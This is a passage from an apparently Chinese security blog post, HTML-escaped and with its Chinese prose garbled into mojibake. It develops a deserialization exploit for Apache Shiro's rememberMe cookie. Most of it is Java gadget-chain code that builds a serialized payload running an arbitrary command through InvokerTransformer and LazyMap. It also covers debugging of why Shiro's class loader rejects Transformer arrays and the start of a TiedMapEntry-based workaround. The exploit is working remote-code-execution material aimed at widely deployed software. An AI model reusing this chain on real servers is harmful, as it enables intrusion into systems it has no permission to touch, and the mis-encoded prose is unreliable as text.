&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ä¸å†ä½¿ç”¨åŽŸCommonsCollections6ä¸­çš„HashSetï¼Œç›´æŽ¥ä½¿ç”¨HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">remove&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;keykey&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†ç”Ÿæˆç»“æžœå‘é€ï¼Œä½†æ˜¯consoleç–¯ç‹‚æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301212540550.png" alt="image-20220301212540550">&lt;/p>
&lt;p>çœ‹åˆ°è¿™ä¸ª&lt;code>org.apache.shiro.io.ClassResolvingObjectInputStream&lt;/code>ï¼Œå®ƒé‡å†™äº†&lt;code>resolveClass&lt;/code>æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ClassResolvingObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStream&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ClassUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">osc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">UnknownClassException&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unable to load ObjectStreamClass [&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">osc&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;]: &amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯ååºåˆ—åŒ–ä¸­ç”¨æ¥æŸ¥æ‰¾ç±»çš„æ–¹æ³•ï¼Œå®ƒé‡å†™äº†&lt;code>ObjectInputStream&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">resolveClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectStreamClass&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">desc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">latestUserDefinedLoader&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">primClasses&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„åˆ°å‰è€…ç”¨çš„æ˜¯&lt;code>org.apache.shiro.util.ClassUtils#forName&lt;/code>ï¼ˆå†…éƒ¨æ˜¯&lt;code>org.apache.catalina.loader.ParallelwebappClassLoader#loadClass&lt;/code>ï¼‰ï¼Œè€Œçˆ¶ç±»ç”¨çš„æ˜¯&lt;code>Class.forName&lt;/code>&lt;/p>
&lt;p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„ä½ç½®æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼›æ³¨æ„å¦‚æžœæ–­ä¸ä¸‹æ¥ï¼Œå¯ä»¥è€ƒè™‘å¾€å‰æ‰¾ä¸€æ‰¾è°ƒç”¨å…³ç³»ï¼Œæ¯”å¦‚org.apache.shiro.mgt.AbstractRememberMeManager#decryptï¼Œå®ƒæ‰§è¡Œcookieéƒ¨åˆ†çš„è§£ç ï¼Œä¸­é—´è§¦å‘ååºåˆ—åŒ–&lt;/p>
&lt;p>&lt;code>resolveClass&lt;/code>ä¾æ¬¡å¾—åˆ°æˆ‘ä»¬é“¾å­ä¸­çš„LazyMapç­‰ç­‰ éƒ½å¾ˆæ­£å¸¸ï¼Œé—®é¢˜å‡ºåœ¨çªç„¶å‡ºçŽ°çš„&lt;code>[Lorg.apache.commons.collections.Transformer;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302012117925.png" alt="image-20220302012117925">&lt;/p>
&lt;p>&lt;code>clazz==null&lt;/code>ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œä½†å¹¶ä¸æ˜¯å› å®ƒæ˜¯&lt;code>[L&lt;/code>æ ‡è®°çš„æ•°ç»„è¿™ä¸€ç‚¹å¯¼è‡´æŠ¥é”™ï¼Œå› ä¸ºåœ¨å®ƒåŽé¢è¿˜æœ‰&lt;code>fqcn=&amp;quot;[Ljava.lang.Object;&amp;quot;&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302013221745.png" alt="image-20220302013221745">&lt;/p>
&lt;p>å®ƒå°±æ²¡æœ‰è¿”å›žnullï¼ŒåŽé¢è¿˜æœ‰å¥½å‡ ä¸ªéƒ½å¸¦&lt;code>[L&lt;/code>æ ‡è®°çš„å¯¹è±¡ï¼Œéƒ½æ²¡æœ‰è¿”å›žnullï¼Œè¿™æ ·çš„çŒœæµ‹æ˜¾ç„¶æ˜¯é”™è¯¯çš„&lt;/p>
&lt;p>é‡æ–°å‘åŒ…å¹¶ç»§ç»­æ–­åœ¨&lt;code>loadClass&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302014123306.png" alt="image-20220302014123306">&lt;/p>
&lt;p>æˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œä½¿ç”¨çš„&lt;code>ClassLoader&lt;/code>æ˜¯ä¸Šé¢çš„&lt;code>ParallelWebappClassLoader&lt;/code>ï¼Œè€Œå®ƒçš„å·¥ä½œæ¨¡å¼å°±æ˜¯è¿™é‡Œçš„bugä¹‹å¤„&lt;/p>
&lt;p>&lt;img src="https://images2015.cnblogs.com/blog/722072/201706/722072-20170623200651991-1212784795.png" alt="img">&lt;/p>
&lt;p>javaè£…è½½ç±»æ—¶éµå¾ªâ€œå…¨ç›˜è´Ÿè´£å§”æ‰˜æœºåˆ¶â€ï¼Œâ€œå…¨ç›˜è´Ÿè´£â€æŒ‡çš„æ˜¯å½“ä¸€ä¸ªClassLoaderè£…è½½ä¸€ä¸ªç±»æ—¶ï¼Œé™¤éžæ˜¾ç¤ºåœ°ä½¿ç”¨å¦å¤–ä¸€ä¸ªClassLoderï¼Œå¦åˆ™è¯¥ç±»æ‰€ä¾èµ–åŠå¼•ç”¨çš„ç±»ä¹Ÿç”±è¿™ä¸ªClassLoderè½½å…¥ï¼›â€œå§”æ‰˜æœºåˆ¶â€æŒ‡å…ˆå§”æ‰˜çˆ¶ç±»è£…è½½å™¨å¯»æ‰¾ç›®æ ‡ç±»ï¼Œåªæœ‰åœ¨æ‰¾ä¸åˆ°çš„æƒ…å†µä¸‹æ‰ä»Žè‡ªå·±çš„ç±»è·¯å¾„ä¸­æŸ¥æ‰¾å¹¶è£…è½½ç›®æ ‡ç±»ï¼Œå¯¹åº”åˆ°è¿™é‡Œï¼Œå½“å®ƒæ‰¾ä¸åˆ°æ—¶å°±ä¼šç”¨ä¸Šé¢çš„&lt;code>URLClassLoader&lt;/code>&lt;/p>
&lt;p>ï¼ˆç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œ&lt;code>WeappClassLoader&lt;/code>é»˜è®¤ä¸é€‚ç”¨å§”æ‰˜æœºåˆ¶&lt;/p>
&lt;p>æ­£å¸¸çš„classè§£æžåŽpathæ˜¯æœ€å‰é¢åŠ &lt;code>/&lt;/code>ï¼Œ&lt;code>.&lt;/code>æ¢ä¸º&lt;code>/&lt;/code>ï¼Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302015732344.png" alt="image-20220302015732344">&lt;/p>
&lt;p>ä¹‹åŽè¿™ä¸ªå€¼ä¼šä¼ å…¥hashMapä½œä¸ºkeyï¼Œæˆ‘ä»¬ç›´æŽ¥åœ¨keyçš„åœ°æ–¹æ–­ï¼Œå‘çŽ°Transformeræ•°ç»„ä¼ å…¥ç¨æœ‰ç‚¹ç‰¹æ®Šï¼ˆæ•°ç»„éƒ½è¿™æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020435664.png" alt="image-20220302020435664">&lt;/p>
&lt;p>é—®é¢˜æ˜¯å®ƒåœ¨å‰ä¸€æ­¥è°ƒç”¨çš„æ˜¯ä¸Šå±‚çš„&lt;code>URLClassLoader&lt;/code>ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020339145.png" alt="image-20220302020339145">&lt;/p>
&lt;p>å¯¹ç…§å…¶å®ƒå¸¦&lt;code>[L&lt;/code>çš„å¯¹è±¡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020711367.png" alt="image-20220302020711367">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020959932.png" alt="image-20220302020959932">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302021055809.png" alt="image-20220302021055809">&lt;/p>
&lt;p>è¢«æ­£å¸¸è§£æž&lt;/p>
&lt;p>ç»è¿‡ä¸Šé¢çš„è°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼šå½“ååºåˆ—åŒ–æµä¸­å‡ºçŽ°éžjavaè‡ªèº«çš„æ•°ç»„ï¼Œä¼šå¼•èµ·&lt;code>ParallelWebappClassLoader&lt;/code>è§¦å‘åŒäº²å§”æ‰˜æœºåˆ¶ï¼Œå°†å¯¹è±¡äº¤ç»™ä¸Šå±‚çš„&lt;code>URLClassLoader&lt;/code>è¿›è¡Œå¤„ç†ï¼Œç”±äºŽå‚æ•°çš„ä¸åŒ¹é…ï¼Œè‡ªç„¶å°±å‡ºçŽ°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯&lt;/p>
&lt;h3 id="æžä¸ªè¡Œçš„">æžä¸ªè¡Œçš„&lt;/h3>
&lt;p>æ—¢ç„¶é—®é¢˜å‡ºåœ¨éžjavaåŽŸç”Ÿçš„Transformeræ•°ç»„ä¸Šï¼Œæˆ‘ä»¬æŠŠå®ƒæ¢ä¸º&lt;code>TiedMapEntry&lt;/code>ï¼Œæž„é€ å‡½æ•°æŽ¥æ”¶ä¸¤ä¸ªå‚æ•° Mapå’ŒKeyï¼Œå®ƒæœ‰ä¸€ä¸ª&lt;code>getValue&lt;/code>æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“æˆ‘ä»¬å‡ºä¼ å…¥çš„mapæ˜¯LazyMapæ—¶ï¼Œè¿™ä¸ªgetå°±å¯ä»¥è§¦å‘transformçš„å›žè°ƒäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
